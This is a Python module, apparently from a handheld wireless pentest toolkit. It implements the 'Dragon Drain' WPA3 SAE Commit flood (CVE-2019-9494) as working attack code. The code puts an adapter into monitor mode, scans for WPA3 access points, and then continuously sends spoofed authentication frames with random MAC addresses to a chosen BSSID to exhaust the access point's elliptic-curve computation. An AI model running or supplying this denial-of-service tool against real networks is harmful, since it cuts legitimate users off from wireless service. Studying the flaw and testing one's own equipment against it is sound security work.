"""Dragon Drain — WPA3 SAE Commit flood DoS (CVE-2019-9494).

Ported from JanOS. Sends spoofed SAE Authentication Commit frames
to overwhelm the target AP's ECC computation.
Runs entirely on the uConsole (scapy), does NOT use ESP32 serial.
"""

import os
import re
import struct
import subprocess
import threading
import time

# SAE constants
_SAE_GROUP_ID = struct.pack("<H", 19)  # NIST P-256
_SCALAR_LEN = 32
_ELEMENT_LEN = 64  # x + y (32 each)


class DragonDrainAttack:
    """Dragon Drain WPA3 SAE flood — headless (no urwid)."""

    def __init__(self, msg_fn=None, loot=None):
        self._msg = msg_fn or (lambda *a: None)
        self._loot = loot
        self._running = False
        self._thread: threading.Thread | None = None
        self._target_bssid = ""
        self._iface = ""
        self.frames = 0
        self._start_time = 0.0

    @property
    def running(self) -> bool:
        return self._running

    # -- Monitor mode detection --

    @staticmethod
    def detect_monitor_ifaces() -> list[str]:
        ifaces: list[str] = []
        try:
            result = subprocess.run(
                ["iw", "dev"], capture_output=True, text=True, timeout=5)
            current = ""
            for line in result.stdout.splitlines():
                m = re.match(r"\s+Interface\s+(\S+)", line)
                if m:
                    current = m.group(1)
                if "type monitor" in line and current:
                    ifaces.append(current)
                    current = ""
        except Exception:
            pass
        return ifaces

    @staticmethod
    def detect_managed_ifaces() -> list[tuple[str, str]]:
        """Return (iface, driver) for managed WiFi interfaces."""
        result: list[tuple[str, str]] = []
        try:
            out = subprocess.run(
                ["iw", "dev"], capture_output=True, text=True, timeout=5
            ).stdout
            current = ""
            is_managed = False
            for line in out.splitlines():
                m = re.match(r"\s+Interface\s+(\S+)", line)
                if m:
                    if current and is_managed:
                        result.append((current, ""))
                    current = m.group(1)
                    is_managed = False
                if "type managed" in line:
                    is_managed = True
            if current and is_managed:
                result.append((current, ""))
        except Exception:
            pass
        return result

    def enable_monitor(self, iface: str) -> bool:
        """Run airmon-ng start on a managed interface."""
        self._msg(f"[DD] airmon-ng start {iface}...")
        try:
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", iface],
                capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                time.sleep(1)
                mon = self.detect_monitor_ifaces()
                if mon:
                    self._msg(f"[DD] Monitor: {mon[0]}")
                    return True
            self._msg(f"[DD] airmon-ng failed: {result.stderr.strip()[:60]}")
        except FileNotFoundError:
            self._msg("[DD] airmon-ng not found — install aircrack-ng")
        except Exception as e:
            self._msg(f"[DD] Error: {e}")
        return False

    # -- SAE frame generation --

    @staticmethod
    def _random_mac() -> str:
        octets = list(os.urandom(6))
        octets[0] = (octets[0] | 0x02) & 0xFE
        return ":".join(f"{b:02x}" for b in octets)

    @staticmethod
    def _generate_sae_commit() -> bytes:
        scalar = os.urandom(_SCALAR_LEN)
        element = os.urandom(_ELEMENT_LEN)
        return _SAE_GROUP_ID + scalar + element

    # -- Scan for WPA3 APs --

    def scan_wpa3(self, iface: str, duration: int = 10) -> list[dict]:
        """Scan for WPA3 APs using scapy. Returns [{bssid, ssid, channel, rssi}]."""
        self._msg(f"[DD] Scanning WPA3 APs on {iface} ({duration}s)...")
        results: dict[str, dict] = {}
        try:
            from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, RadioTap

            def process(pkt):
                if not pkt.haslayer(Dot11Beacon):
                    return
                bssid = pkt[Dot11].addr3
                if not bssid:
                    return
                bssid = bssid.upper()
                ssid = ""
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0 and elt.info:
                        try:
                            ssid = elt.info.decode("utf-8", errors="replace")
                        except Exception:
                            pass
                    elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

                is_wpa3 = False
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 48 and elt.info:
                        raw = bytes(elt.info)
                        if b'\x00\x0f\xac\x08' in raw or b'\x00\x0f\xac\x18' in raw:
                            is_wpa3 = True
                    elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

                rssi = -100
                if pkt.haslayer(RadioTap):
                    try:
                        rssi = int(pkt[RadioTap].dBm_AntSignal)
                    except Exception:
                        pass

                channel = 0
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 3 and elt.info:
                        channel = elt.info[0]
                    elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

                if is_wpa3:
                    if bssid not in results or rssi > results[bssid]["rssi"]:
                        results[bssid] = {"bssid": bssid, "ssid": ssid,
                                          "channel": channel, "rssi": rssi}

            sniff(iface=iface, prn=process, timeout=duration, store=0)
        except ImportError:
            self._msg("[DD] ERROR: scapy not installed")
        except Exception as e:
            self._msg(f"[DD] Scan error: {e}")

        aps = sorted(results.values(), key=lambda x: x["rssi"], reverse=True)
        self._msg(f"[DD] Found {len(aps)} WPA3 AP(s)")
        return aps

    # -- Flood thread --

    def _flood_thread(self) -> None:
        try:
            from scapy.all import RadioTap, Dot11, Dot11Auth, Raw, sendp
        except ImportError:
            self._msg("[DD] ERROR: scapy not installed")
            self._running = False
            return

        self._msg(f"[DD] Flooding {self._target_bssid} via {self._iface}...")
        count = 0
        last_log = 0.0

        while self._running:
            try:
                src_mac = self._random_mac()
                payload = self._generate_sae_commit()
                frame = (
                    RadioTap()
                    / Dot11(type=0, subtype=11,
                            addr1=self._target_bssid,
                            addr2=src_mac,
                            addr3=self._target_bssid)
                    / Dot11Auth(algo=3, seqnum=1, status=0)
                    / Raw(load=payload)
                )
                sendp(frame, iface=self._iface, verbose=0, count=1)
                count += 1
                self.frames = count

                now = time.time()
                if now - last_log >= 2.0:
                    rate = count / max(now - self._start_time, 0.1)
                    self._msg(f"[DD] {count} frames ({rate:.1f}/s)")
                    last_log = now

                time.sleep(0.0625)  # ~16 fps
            except OSError as e:
                self._msg(f"[DD] Send error: {e}")
                time.sleep(1.0)
            except Exception as e:
                self._msg(f"[DD] Error: {e}")
                self._running = False
                break

        self._running = False
        self._msg(f"[DD] Stopped. Total: {count} frames")

    # -- Start / stop --

    def start(self, bssid: str, iface: str = "") -> bool:
        """Start Dragon Drain. Auto-detects monitor interface if not given."""
        if self._running:
            return False

        bssid = bssid.strip().upper()
        if not re.match(r'^[0-9A-F]{2}(:[0-9A-F]{2}){5}$', bssid):
            self._msg("[DD] Invalid BSSID format")
            return False

        if not iface:
            ifaces = self.detect_monitor_ifaces()
            if not ifaces:
                # Try to auto-enable on first managed adapter
                managed = self.detect_managed_ifaces()
                if managed:
                    self.enable_monitor(managed[0][0])
                    ifaces = self.detect_monitor_ifaces()
                if not ifaces:
                    self._msg("[DD] No monitor interface — plug in WiFi adapter")
                    return False
            iface = ifaces[0]

        self._target_bssid = bssid
        self._iface = iface
        self._running = True
        self.frames = 0
        self._start_time = time.time()

        if self._loot:
            self._loot.log_attack_event(f"STARTED: Dragon Drain ({bssid} via {iface})")

        self._thread = threading.Thread(target=self._flood_thread, daemon=True)
        self._thread.start()
        self._msg(f"[DD] Attack started: {bssid} via {iface}")
        return True

    def stop(self) -> None:
        if not self._running:
            return
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        if self._loot:
            self._loot.log_attack_event(f"STOPPED: Dragon Drain (frames: {self.frames})")
        self._msg("[DD] Dragon Drain stopped")
